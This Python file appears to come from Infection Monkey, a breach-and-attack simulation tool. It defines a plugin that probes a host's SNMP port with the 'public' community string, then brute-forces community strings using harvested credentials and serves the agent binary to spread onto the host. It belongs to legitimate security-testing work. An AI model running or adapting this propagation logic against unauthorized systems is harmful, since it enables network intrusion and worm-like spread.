import logging
from functools import partial
from pprint import pformat
from typing import Any, Dict, Sequence, Tuple

# common imports
from common.event_queue import IAgentEventPublisher
from common.types import AgentID, Event
from common.utils.code_utils import del_key

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository, IAgentOTPProvider
from infection_monkey.exploit.tools import all_udp_ports_are_closed
from infection_monkey.exploit.tools.http_agent_binary_server import start_agent_binary_server
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.network import TCPPortSelector
from infection_monkey.propagation_credentials_repository import IPropagationCredentialsRepository

from .community_string_generator import generate_community_strings
from .snmp_client import SNMPClient
from .snmp_exploit_client import SNMPExploitClient
from .snmp_exploiter import SNMPExploiter
from .snmp_options import SNMPOptions

logger = logging.getLogger(__name__)


SNMP_PORTS = [161]


def should_attempt_exploit(host: TargetHost, snmp_client: SNMPClient) -> Tuple[bool, str]:
    if all_udp_ports_are_closed(host, SNMP_PORTS):
        return False, "Host has no open SNMP ports"
    try:
        snmp_client.get_system_name(host.ip, "public")
    except Exception:
        return False, "Host does not have SNMP enabled"
    return True, ""


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: AgentID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        tcp_port_selector: TCPPortSelector,
        otp_provider: IAgentOTPProvider,
        **kwargs,
    ):
        self._snmp_client = SNMPClient()
        exploit_client = SNMPExploitClient(
            agent_id, agent_event_publisher, plugin_name, self._snmp_client
        )
        agent_binary_server_factory = partial(
            start_agent_binary_server,
            agent_binary_repository=agent_binary_repository,
            tcp_port_selector=tcp_port_selector,
        )
        get_community_strings = partial(
            generate_community_strings, propagation_credentials_repository
        )
        self._snmp_exploiter = SNMPExploiter(
            agent_id,
            exploit_client,
            agent_binary_server_factory,
            get_community_strings,
            otp_provider,
        )

    def run(
        self,
        *,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        **kwargs,
    ) -> ExploiterResultData:
        # HTTP ports options are hack because they are needed in fingerprinters
        del_key(options, "http_ports")

        try:
            logger.debug(f"Parsing options: {pformat(options)}")
            snmp_options = SNMPOptions(**options)
        except Exception as err:
            msg = f"Failed to parse SNMP options: {err}"
            logger.exception(msg)
            return ExploiterResultData(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

        attempt_exploit, msg = should_attempt_exploit(host, self._snmp_client)
        if not attempt_exploit:
            logger.debug(f"Skipping brute force of host {host.ip}: {msg}")
            return ExploiterResultData(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

        try:
            logger.debug(f"Running SNMP exploiter on host {host.ip}")
            return self._snmp_exploiter.exploit_host(
                host, servers, current_depth, snmp_options, interrupt
            )
        except Exception as err:
            msg = f"An unexpected exception occurred while attempting to exploit host: {err}"
            logger.exception(msg)
            return ExploiterResultData(
                exploitation_success=False, propagation_success=False, error_message=msg
            )
